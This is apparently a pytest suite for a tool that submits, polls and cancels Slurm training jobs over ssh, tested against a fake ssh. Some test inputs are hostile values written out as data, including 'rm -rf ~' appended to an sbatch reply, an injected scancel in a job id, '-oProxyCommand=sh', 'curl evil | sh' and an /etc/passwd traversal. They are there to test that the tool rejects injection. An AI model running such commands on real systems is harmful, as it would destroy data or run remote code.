"""The cluster side of Train, against a fake ssh: checks, the submit limit, submit with chained
parts, no retry after an sbatch error, job states, logs, cancel (own jobs only), look-for-it, and
the window commands. The scontrol, squeue and sbatch answers below are copied from Explorer."""

from __future__ import annotations

import asyncio
import json
import re
import shlex
import time
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest

from phi_studio import hpc, train
from phi_studio.server import Studio
from phi_studio.train import POLICIES_060, Job, Settings

STAMP = "20261004-190000"
USER = "patodia.pa"
# scontrol show partition gpu, Explorer, 2026-10-04 (trimmed to the lines Studio reads)
PARTITION_GPU = """PartitionName=gpu
   AllocNodes=ALL Default=NO QoS=gpu
   DefaultTime=04:00:00 DisableRootJobs=NO ExclusiveUser=NO GraceTime=0 Hidden=NO
   MaxNodes=UNLIMITED MaxTime=08:00:00 MinNodes=0 LLN=NO MaxCPUsPerNode=UNLIMITED
   State=UP TotalCPUs=1224 TotalNodes=25 SelectTypeParameters=NONE
"""
PARTITION_SHORT = PARTITION_GPU.replace("=gpu\n", "=gpu-short\n").replace(
    "QoS=gpu", "QoS=gpu-short").replace("MaxTime=08:00:00", "MaxTime=02:00:00")  # fmt: skip
# sbatch --test-only on gpu with 8 jobs submitted, Explorer, 2026-10-04
QOS_REFUSED = ("sbatch: error: QOSMaxSubmitJobPerUserLimit\nallocation failure: Job violates "
               "accounting/QOS policy (job submit limit, user's size and/or time limits)\n")
TEST_OK = ("sbatch: Job 10813202 to start at 2026-10-04T19:02:30 using 16 processors on nodes "
           "d1011 in partition gpu-short\n")
# The commands Studio may run on the login node (no python, find, du or recursive grep).
ALLOWED = {"squeue", "sacct", "sacctmgr", "scontrol", "sbatch", "scancel", "cat", "ls", "head",
           "tail", "test", "mkdir", "df", "quota", "echo", "whoami", "set"}  # fmt: skip


ENV = f"/home/{USER}/.conda/envs/lerobot-gpu"
ENVS = f"/shared/centos7/anaconda3/2024.06\n{ENV}\n"
SITE = "lerobot-0.6.0.dist-info\ntorch-2.11.0+cu128.dist-info\nwandb-0.27.2.dist-info\n"


def queue(n: int, partition: str = "gpu") -> str:
    """n jobs of the user's own, not Studio's: the RL runs that fill the queue."""
    return "".join(f"1080792{i}|{partition}|{'RUNNING' if i == 0 else 'PENDING'}|p2_ma2ppo_{i}\n"
                   for i in range(n))  # fmt: skip


def limits(n: int) -> str:
    m = hpc.MARK
    return f"gpu|8|4||gres/gpu=4\n{m}\n{USER}|cs6140.202630||normal||\n{m}\n{queue(n)}"


Reply = tuple[int, str, str] | Callable[[str, str | None], tuple[int, str, str]]


class FakeSSH:
    """Answers ssh by the first rule whose pattern the remote command matches; records each."""

    def __init__(self, rules: list[tuple[str, Reply]]) -> None:
        self.rules = rules
        self.calls: list[tuple[str, str | None]] = []

    def __call__(
        self, argv: list[str], stdin: str | None, timeout: float
    ) -> tuple[int, bytes, bytes]:
        assert argv[:8] == ["ssh", *hpc.SSH_OPTS, "--"], argv  # the host can never be an option
        assert len(argv) == 10
        remote = argv[9]
        self.calls.append((remote, stdin))
        for pat, reply in self.rules:
            if re.search(pat, remote):
                rc, out, err = reply(remote, stdin) if callable(reply) else reply
                return rc, out.encode(), err.encode()
        return 99, b"", f"fake ssh: no rule for {remote}".encode()

    def remote(self) -> list[str]:
        return [c for c, _ in self.calls]

    def matching(self, pat: str) -> list[str]:
        return [c for c in self.remote() if re.search(pat, c)]


def command_words(cmd: str) -> list[str]:
    """The program names in a shell line: the first word, and the first after ; && || |."""
    lex = shlex.shlex(cmd, posix=True, punctuation_chars=True)
    words, start = [], True
    for tok in lex:
        if tok in (";", "&&", "||", "|"):
            start = True
        elif start:
            words.append(tok)
            start = False
    return words


def assert_login_node_safe(fake: FakeSSH) -> None:
    for cmd in fake.remote():
        assert set(command_words(cmd)) <= ALLOWED, cmd
        assert not re.search(r"\b(python|find|du|rm)\b|grep -r", cmd), cmd


def sbatch_ids(start: int = 10813300) -> Callable[[str, str | None], tuple[int, str, str]]:
    n = [start]

    def reply(remote: str, stdin: str | None) -> tuple[int, str, str]:
        n[0] += 1
        return 0, f"{n[0]}\n", ""

    return reply


def cluster_rules(submitted: int = 0, sbatch: Reply | None = None,
                  test: Reply = (0, "", TEST_OK)) -> list[tuple[str, Reply]]:  # fmt: skip
    return [
        (r"^echo connected$", (0, "connected\n", "")),
        (r"^whoami", (0, f"{USER}\n/home/{USER}\n", "")),
        (r"^scontrol show partition gpu$", (0, PARTITION_GPU, "")),
        (r"^scontrol show partition gpu-short$", (0, PARTITION_SHORT, "")),
        (r"^sacctmgr", (0, limits(submitted), "")),
        (r"^cat /home/patodia.pa/.conda/environments.txt$", (0, ENVS, "")),
        (r"^test -x ", (0, f"executable\n#!{ENV}/bin/python3.12\n", "")),
        (r"^ls /home/.*/site-packages$", (0, SITE, "")),
        (r"^mkdir -p -- \S+/runs && test -w", (0, "writable\n", "")),
        (r"^sbatch --test-only", test),
        (r"^df -h", (1, "Filesystem Size Used Avail Use% Mounted on\nvast 1.5P 1.3P 194T 88% "
                        "/scratch\n", "quota: error while getting quota from vast1: Operation not "
                                      "permitted\n")),  # fmt: skip
        (r"^set -o noclobber && mkdir -p -- \S+/logs && cat > ", (0, "", "")),
        (r"^sbatch --parsable", sbatch or sbatch_ids()),
    ]


def settings() -> Settings:
    return Settings(remote_user=USER).validate()


def job(parts: int = 3, **kw: Any) -> Job:
    d = {"where": "cluster", "dataset": "Parv-09/cubes", "policy": "act", "steps": 100_000,
         "batch_size": 8, "save_freq": 10_000, "name": "act-cubes", "stamp": STAMP,
         "parts": parts, **kw}  # fmt: skip
    return Job.from_dict(d, POLICIES_060)


# -- submit ----------------------------------------------------------------------------------------
def test_submit_chains_parts_with_afterany_and_records_every_id() -> None:
    fake = FakeSSH(cluster_rules(submitted=2))
    j, saved = job(), []
    run = train.new_run(j)
    sub = hpc.submit(hpc.Cluster(settings(), fake), settings(), j, run, saved.append)
    assert sub.ok, sub.message
    calls = fake.matching(r"^sbatch")
    run_dir = f"/scratch/{USER}/phi-studio/runs/act-cubes-{STAMP}"
    assert calls == [
        f"sbatch --parsable --job-name=act-cubes-{STAMP}-p1 --export=ALL,PHI_PART=1 "
        f"{run_dir}/job.sbatch",
        f"sbatch --parsable --job-name=act-cubes-{STAMP}-p2 --export=ALL,PHI_PART=2 "
        f"--dependency=afterany:10813301 {run_dir}/job.sbatch",
        f"sbatch --parsable --job-name=act-cubes-{STAMP}-p3 --export=ALL,PHI_PART=3 "
        f"--dependency=afterany:10813302 {run_dir}/job.sbatch",
    ]
    assert [x["id"] for x in run["jobs"]] == ["10813301", "10813302", "10813303"]
    assert run["jobs"][1]["log"] == f"{run_dir}/logs/act-cubes-{STAMP}-p2-10813302.out"
    write = [s for c, s in fake.calls if c.startswith("set -o noclobber && mkdir -p -- ")]
    assert write == [train.sbatch_script(j, settings(), run_dir)]  # the script goes on stdin
    assert saved[-1]["jobs"] == run["jobs"] and run["error"] is None
    assert_login_node_safe(fake)


@pytest.mark.parametrize("submitted,parts", [(8, 1), (6, 3)])
def test_submit_refuses_past_the_limit_and_touches_nothing(submitted, parts) -> None:
    fake = FakeSSH(cluster_rules(submitted=submitted))
    with pytest.raises(hpc.ClusterError) as e:
        hpc.submit(hpc.Cluster(settings(), fake), settings(), job(parts), train.new_run(job(parts)),
                   lambda r: None)  # fmt: skip
    assert f"You have {submitted} jobs submitted in gpu and the limit is 8" in str(e.value)
    assert f"This run needs {parts}" in str(e.value)
    assert not fake.matching(r"^(mkdir|sbatch|scancel)")


def test_an_sbatch_error_stops_and_is_never_retried() -> None:
    n = [0]

    def flaky(remote: str, stdin: str | None) -> tuple[int, str, str]:
        n[0] += 1
        if n[0] == 2:  # Explorer, 2026-09-29: printed this, then made the job anyway
            return 1, "", "sbatch: error: Batch job submission failed: Unexpected message received"
        return 0, f"1081330{n[0]}\n", ""

    fake = FakeSSH(cluster_rules(sbatch=flaky))
    run, saved = train.new_run(job()), []
    sub = hpc.submit(hpc.Cluster(settings(), fake), settings(), job(), run, saved.append)
    assert not sub.ok
    assert len(fake.matching(r"^sbatch --parsable")) == 2  # part 3 never sent, part 2 not retried
    assert "did not retry" in sub.message and "Look for it" in sub.message
    assert [x["id"] for x in run["jobs"]] == ["10813301"]
    assert run["error"]["part"] == 2 and "Unexpected message" in run["error"]["output"]
    assert saved[-1]["error"]


def test_an_sbatch_answer_that_is_not_a_job_id_counts_as_an_error() -> None:
    fake = FakeSSH(cluster_rules(sbatch=(0, "Submitted batch job; rm -rf ~\n", "")))
    run = train.new_run(job(1))
    sub = hpc.submit(hpc.Cluster(settings(), fake), settings(), job(1), run, lambda r: None)
    assert not sub.ok and run["jobs"] == []


def test_an_existing_script_is_never_overwritten() -> None:
    # noclobber: the shell refuses `>` onto an existing file
    rules = [(r"^set -o noclobber && mkdir", (1, "", "bash: job.sbatch: cannot overwrite existing "
                                                     "file"))] + cluster_rules()  # fmt: skip
    fake = FakeSSH(rules)
    with pytest.raises(hpc.ClusterError, match="Nothing was submitted"):
        hpc.submit(hpc.Cluster(settings(), fake), settings(), job(), train.new_run(job()),
                   lambda r: None)  # fmt: skip
    assert not fake.matching(r"^sbatch")


# -- states, logs, cancel, find -----------------------------------------------------------------
def submitted_run(states: tuple[str, ...] = ("RUNNING", "PENDING", "PENDING")) -> dict[str, Any]:
    remote = f"/scratch/{USER}/phi-studio/runs/act-cubes-{STAMP}"
    run = train.new_run(job(max(1, len(states))), remote_dir=remote, user=USER)
    for k, st in enumerate(states, 1):
        jid = str(10813300 + k)
        name = hpc.part_name(run["id"], k)
        run["jobs"].append({"part": k, "id": jid, "name": name, "state": st,
                            "log": f"{run['remote_dir']}/logs/{name}-{jid}.out"})  # fmt: skip
    return run


@pytest.mark.parametrize(
    "states,want",
    [
        ((), "SUBMITTING"),
        (("PENDING", "PENDING"), "PENDING"),
        (("RUNNING", "PENDING"), "RUNNING"),
        (("TIMEOUT", "PENDING"), "PENDING"),  # part 1 used its 8 hours; part 2 waits for a GPU
        (("TIMEOUT", "RUNNING"), "RUNNING"),
        (("COMPLETED", "CANCELLED"), "COMPLETED"),  # done early: the script cancelled part 2
        (("TIMEOUT", "TIMEOUT"), "TIMEOUT"),  # out of parts before the last step
        (("FAILED", "FAILED"), "FAILED"),
    ],
)
def test_run_state(states, want) -> None:
    assert hpc.run_state(submitted_run(states) if states else train.new_run(job(1))) == want


def test_a_run_whose_submit_failed_reads_not_submitted() -> None:
    run = train.new_run(job(1))
    run["error"] = {"part": 1}
    assert hpc.run_state(run) == "NOT SUBMITTED"


def test_poll_reads_states_and_the_next_piece_of_the_log() -> None:
    m = hpc.MARK
    out = (f"10813301|RUNNING|1:02:03|d1011\n10813302|PENDING|0:00|(Dependency)\n{m}\n"
           f"10813301|RUNNING|01:02:03|0:0\n10813302|PENDING|00:00:00|0:0\n10813303|PENDING|"
           f"00:00:00|0:0\n{m}\nINFO 2026-10-04 16:03:23 ot_train.py:606 step:2 smpl:4 ep:0 "
           "epch:0.00 loss:78.604 grdn:1423.651 lr:1.0e-05 updt_s:0.046 data_s:0.010 smp/s:36\n")
    fake = FakeSSH([(r"^squeue -h -j 10813301,10813302,10813303 ", (0, out, ""))])
    run = submitted_run()
    chunk, states, _ = hpc.poll(hpc.Cluster(settings(), fake), run, run["jobs"][0]["log"], 500)
    assert "tail -c +501 " in fake.remote()[0] and f"| head -c {hpc.LOG_CHUNK}" in fake.remote()[0]
    assert chunk.startswith(b"INFO 2026") and states["10813302"]["reason"] == "Dependency"
    assert states["10813301"] == {"state": "RUNNING", "elapsed": "1:02:03", "exit": "0:0",
                                  "reason": ""}  # fmt: skip
    assert states["10813303"]["state"] == "PENDING"  # sacct knows it, squeue did not list it
    with pytest.raises(hpc.ClusterError):
        hpc.poll(hpc.Cluster(settings(), fake), run, "/scratch/x/../../etc/passwd", 0)
    assert_login_node_safe(fake)


def test_refresh_skips_runs_that_ended() -> None:
    fake = FakeSSH([(r"^squeue", (0, f"{hpc.MARK}\n10813301|COMPLETED|00:10:00|0:0\n", ""))])
    done = submitted_run(("COMPLETED", "CANCELLED"))
    live = submitted_run(("RUNNING",))
    live["id"] = f"other-{STAMP}"
    live["jobs"][0]["id"] = "10813301"
    states, _ = hpc.refresh(hpc.Cluster(settings(), fake), [done, live])
    assert fake.remote()[0].startswith("squeue -h -j 10813301 ")
    assert states["10813301"]["state"] == "COMPLETED"
    assert hpc.refresh(hpc.Cluster(settings(), fake), [done]) == ({}, None)


def test_cancel_sends_only_this_runs_live_parts_last_first() -> None:
    fake = FakeSSH([(r"^scancel", (0, "", ""))])
    run = submitted_run(("TIMEOUT", "RUNNING", "PENDING"))
    run["jobs"].append({"part": 4, "id": "10807922; scancel -u patodia.pa", "state": "PENDING"})
    hpc.cancel(hpc.Cluster(settings(), fake), run)
    assert fake.remote() == ["scancel 10813303 10813302"]
    assert hpc.cancel(hpc.Cluster(settings(), fake),
                      submitted_run(("COMPLETED", "CANCELLED"))) is None  # fmt: skip
    assert len(fake.calls) == 1


def test_find_adopts_only_this_runs_part_names() -> None:
    m = hpc.MARK
    out = (f"10813302|act-cubes-{STAMP}-p2|PENDING\n{m}\n10813301|act-cubes-{STAMP}-p1|RUNNING\n"
           f"10813302|act-cubes-{STAMP}-p2|PENDING\n10807922|p2_ma2ppo_A_s1_b|RUNNING\n")
    fake = FakeSSH([(r"^squeue -h -u patodia.pa -n ", (0, out, ""))])
    run = submitted_run(())
    run["parts_planned"] = 3
    found, _ = hpc.find(hpc.Cluster(settings(), fake), run)
    assert [f["id"] for f in found] == ["10813301", "10813302"]
    day_before = time.strftime("%Y-%m-%d", time.localtime(run["created"] - 86400))
    assert f"-S {day_before} " in fake.remote()[0]
    assert hpc.adopt(run, found) == 2 and hpc.adopt(run, found) == 0
    assert [(x["part"], x["id"]) for x in run["jobs"]] == [(1, "10813301"), (2, "10813302")]
    assert run["jobs"][0]["log"].endswith(f"/logs/act-cubes-{STAMP}-p1-10813301.out")
    assert_login_node_safe(fake)


# -- the checklist ---------------------------------------------------------------------------------
def test_checks_stop_at_ssh_and_name_the_fix() -> None:
    fake = FakeSSH([(r".", (255, "", "patodia.pa@login.explorer.northeastern.edu: Permission "
                                     "denied (publickey,keyboard-interactive)."))])  # fmt: skip
    rows: list[dict[str, Any]] = []
    hpc.run_checks(hpc.Cluster(Settings(), fake), Settings(), None, {}, rows.append)
    assert rows[0]["status"] == "fail" and "Duo" in rows[0]["fix"]
    assert rows[0]["runs"][0]["cmd"].startswith("ssh -o ControlPath=none -o BatchMode=yes")
    assert {r["status"] for r in rows[1:]} == {"skip"} and len(rows) == 1 + len(hpc.LATER)
    assert len(fake.calls) == 1


def test_checks_at_the_submit_limit_test_on_the_short_partition() -> None:
    fake = FakeSSH(cluster_rules(submitted=8, test=lambda c, s: (
        (0, "", TEST_OK) if "--partition=gpu-short" in c else (1, "", QOS_REFUSED))))
    rows: list[dict[str, Any]] = []
    s = Settings()
    needs = {"training": ["wandb", "torch"], "smolvla": ["transformers", "num2words"]}
    learnt = hpc.run_checks(hpc.Cluster(s, fake), s, job(1), needs, rows.append)
    by = {r["id"]: r for r in rows}
    assert [r["id"] for r in rows] == ["ssh", "user", "partition", "limits", "env", "extras",
                                       "base", "test", "space"]  # fmt: skip
    assert learnt["user"] == USER and learnt["free"] == 0 and s.remote_user == USER
    assert by["partition"]["status"] == "pass" and "08:00:00" in by["partition"]["detail"]
    assert by["limits"]["status"] == "warn" and "0 more can be submitted" in by["limits"]["detail"]
    assert by["env"]["status"] == "pass" and by["extras"]["status"] == "pass"
    assert by["base"]["status"] == "pass"
    t = by["test"]
    assert t["status"] == "warn" and "QOSMaxSubmitJobPerUserLimit" in t["runs"][0]["output"]
    assert "--partition=gpu-short --time=02:00:00" in t["runs"][2]["cmd"]
    assert by["space"]["status"] == "warn" and "88% full" in by["space"]["detail"]
    tests = [s for c, s in fake.calls if c.startswith("sbatch --test-only")]
    assert len(tests) == 2 and all(x and x.startswith("#!/bin/bash") for x in tests)
    assert not fake.matching(r"^sbatch --parsable|^scancel")  # a check never submits or cancels
    assert_login_node_safe(fake)


def test_checks_name_missing_packages_for_the_policy() -> None:
    fake = FakeSSH(cluster_rules())
    rows: list[dict[str, Any]] = []
    needs = {"training": ["wandb"], "smolvla": ["transformers", "num2words"]}
    hpc.run_checks(hpc.Cluster(Settings(), fake), Settings(), job(1, policy="smolvla"), needs,
                   rows.append)  # fmt: skip
    ex = next(r for r in rows if r["id"] == "extras")
    assert ex["status"] == "warn" and "num2words, transformers" in ex["detail"]


def test_rsync_copies_over_the_same_ssh_options(tmp_path) -> None:
    seen: dict[str, Any] = {}

    class Done:
        returncode, stderr = 0, None

        def poll(self) -> int:
            return 0

    def popen(argv: list[str], **kw: Any) -> Done:
        seen["argv"] = argv
        return Done()

    rc, _ = hpc.rsync("hpc", "/scratch/u/r/train/checkpoints/last/pretrained_model",
                      tmp_path / "m", 10, lambda n: None, popen)  # fmt: skip
    assert rc == 0
    assert seen["argv"] == ["rsync", "-a", "--partial", f"--timeout={hpc.RSYNC_IO_TIMEOUT_S}",
                            "-e", "ssh " + " ".join(hpc.RSYNC_SSH), "--",
                            "hpc:/scratch/u/r/train/checkpoints/last/pretrained_model/",
                            f"{tmp_path / 'm'}/"]  # fmt: skip
    assert " ".join(hpc.SSH_OPTS) in seen["argv"][5]


# -- the window commands ---------------------------------------------------------------------------
class Window:
    def __init__(self) -> None:
        self.got: list[dict[str, Any]] = []

    def push(self, msg: dict[str, Any]) -> None:
        self.got.append(msg)

    def last(self, type_: str) -> dict[str, Any]:
        return next(m for m in reversed(self.got) if m["type"] == type_)


@pytest.fixture
def studio(tmp_path) -> Studio:
    st = Studio({"kind": "mock"}, 1, token="t0k", data_dir=tmp_path)
    st.train.policies = train.fallback_policies()  # type: ignore[attr-defined]
    return st


def test_commands_that_change_anything_need_control(studio) -> None:
    control = {cmd: c for cmd, (_, c) in studio.handlers.items() if cmd.startswith("train_")}
    assert control == {"train_init": False, "train_preview": False, "train_refresh": False,
                       "train_poll": False, "train_settings": True, "train_check": True,
                       "train_submit": True, "train_mac_start": True, "train_cancel": True,
                       "train_find": True, "train_fetch": True, "train_resubmit": True}  # fmt: skip
    fake = FakeSSH(cluster_rules())
    studio.train.runner = fake  # type: ignore[attr-defined]
    a, b = Window(), Window()
    studio.controller = a  # type: ignore[assignment]
    form = {"where": "cluster", "dataset": "Parv-09/cubes", "policy": "act", "steps": 1000,
            "batch_size": 8, "save_freq": 500, "name": "x", "stamp": STAMP}  # fmt: skip
    for cmd in ("train_submit", "train_cancel", "train_check", "train_fetch"):
        raw = json.dumps({"cmd": cmd, "job": form, "run": f"x-{STAMP}"})
        studio._from_client(b, raw)  # type: ignore[arg-type]
    assert fake.calls == [] and all(m["type"] == "error" for m in b.got) and len(b.got) == 4


def test_check_submit_poll_and_cancel_through_the_window_commands(studio, tmp_path) -> None:
    api = studio.train  # type: ignore[attr-defined]
    m = hpc.MARK
    log = ("phi-studio: starting at step 0\n" + "".join(
        f"INFO 2026-10-04 16:0{i}:00 ot_train.py:606 step:{i * 10} smpl:1K ep:1 epch:0.01 "
        f"loss:{2 - i / 10:.3f} grdn:1.000 lr:1.0e-04 updt_s:0.300 data_s:0.005\n"
        for i in range(1, 6)))
    states = (f"10813301|RUNNING|0:05:00|d1011\n{m}\n10813301|RUNNING|00:05:00|0:0\n"
              f"10813302|PENDING|00:00:00|0:0\n{m}\n")
    fake = FakeSSH([(r"^squeue -h -j ", (0, states + log, "")), (r"^scancel", (0, "", ""))]
                   + cluster_rules())
    api.runner = fake
    w = Window()
    form = {"where": "cluster", "dataset": "Parv-09/cubes", "policy": "act", "steps": 1000,
            "batch_size": 8, "save_freq": 500, "name": "act-cubes", "stamp": STAMP, "parts": 2}

    async def go() -> None:
        await api.run_check(w, {"job": form})
        await api.preview(w, {"job": form})
        await api.submit(w, {"job": form})
        await api.poll(w, {"run": f"act-cubes-{STAMP}"})
        await api.cancel(w, {"run": f"act-cubes-{STAMP}"})
        await api.cancel(w, {"run": f"someone-else-{STAMP}"})

    asyncio.run(go())
    saved = json.loads((tmp_path / "train_settings.json").read_text())
    assert saved["remote_user"] == USER  # learnt by the check
    p = w.last("train_preview")
    assert p["ok"] and p["plan"]["parts"] == 2 and p["script"].startswith("#!/bin/bash")
    sub = w.last("train_submitted")
    assert sub["ok"], sub
    runs = json.loads((tmp_path / "train_jobs.json").read_text())["runs"]
    assert [j["id"] for j in runs[0]["jobs"]] == ["10813301", "10813302"]
    lg = w.last("train_log")
    assert [x["step"] for x in lg["points"]] == [10, 20, 30, 40, 50]
    assert lg["total"] == 1000 and lg["view"]["state"] == "RUNNING"
    assert lg["rate"] == pytest.approx(10 / 60)  # 40 steps in 4 minutes
    assert fake.matching(r"^scancel") == ["scancel 10813302 10813301"]
    err = w.last("train_error")
    assert err["what"] == "cancel" and "only on runs it started" in err["message"]
    assert len(fake.matching(r"^scancel")) == 1  # the unknown run sent nothing
    assert_login_node_safe(fake)


def test_settings_from_the_window_are_checked_and_keep_the_learnt_user(studio, tmp_path) -> None:
    api = studio.train  # type: ignore[attr-defined]
    api.store.save_settings(Settings(remote_user=USER))
    w = Window()
    bad = {"host": "-oProxyCommand=sh", "env": "source activate x\ncurl evil | sh"}
    asyncio.run(api.save_settings(w, {"settings": bad}))
    assert set(w.last("train_error")["errors"]) == {"host", "env"}
    asyncio.run(api.save_settings(w, {"settings": {"host": "hpc2", "remote_user": "root"}}))
    s = json.loads((tmp_path / "train_settings.json").read_text())
    assert s["host"] == "hpc2" and s["remote_user"] == USER


def test_a_mac_run_records_and_returns_the_command(studio, tmp_path) -> None:
    api = studio.train  # type: ignore[attr-defined]
    w = Window()
    form = {"where": "mac", "dataset": "Parv-09/Ava_1", "policy": "act", "steps": 20,
            "batch_size": 2, "save_freq": 10, "name": "ava", "stamp": STAMP}  # fmt: skip
    asyncio.run(api.mac_start(w, {"job": form}))
    ready = w.last("train_mac_ready")
    assert "--policy.device=mps" in ready["command"]
    assert ready["command"].endswith(f"tee -a {tmp_path}/train/ava-{STAMP}/train.log")
    run = api.store.run(f"ava-{STAMP}")
    assert run and run["where"] == "mac" and api.mac_state(run) == "NOT STARTED"
    log = Path(run["local_dir"]) / "train.log"
    log.write_text("INFO 2026-10-04 16:03:23 ot_train.py:606 step:2 smpl:4 ep:0 epch:0.00 "
                   "loss:78.604 grdn:1423.651 lr:1.0e-05 updt_s:0.046 data_s:0.010 smp/s:36\n")
    asyncio.run(api.poll(w, {"run": f"ava-{STAMP}"}))
    lg = w.last("train_log")
    assert lg["points"] == [{"step": 2, "sure": True, "loss": 78.604, "lr": 1e-05}]
    assert lg["view"]["state"] == "STOPPED"
